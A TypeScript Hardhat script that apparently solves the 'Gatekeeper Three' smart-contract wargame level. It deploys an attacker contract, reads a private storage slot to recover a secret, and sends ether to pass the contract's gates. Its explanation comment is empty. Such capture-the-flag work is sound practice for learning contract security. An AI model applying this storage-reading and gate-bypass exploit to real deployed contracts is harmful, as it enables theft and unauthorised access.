import { ethers } from "hardhat";
import { Contract } from "ethers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { abi as GateKeeper3ABI } from "../../artifacts/contracts/28.Gatekeeper Three/GatekeeperThree.sol/GatekeeperThree.json";
import { deployContract } from "../../utils/deployContract";
import { displayResult } from "../../utils/displayResult";

const targetAddress = "0x9874E3Fd9c9EFA1eda08c19d558Bf1703003B9cE";

async function main() {
  const [attacker]: SignerWithAddress[] = await ethers.getSigners();
  const GateKeeperAttacker = await deployContract("GKTAttacker", attacker, [
    targetAddress,
  ]);

  const GK3 = new Contract(targetAddress, GateKeeper3ABI, attacker);
  const trickAddress =
    "0x" + (await ethers.provider.getStorageAt(GK3.address, 2)).slice(26);
  const tx = await GateKeeperAttacker.attack(trickAddress, {
    value: ethers.utils.parseEther("0.002"),
  });
  await tx.wait();

  displayResult((await GK3.entrant()) === attacker.address);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/* Explanation:
 
 */
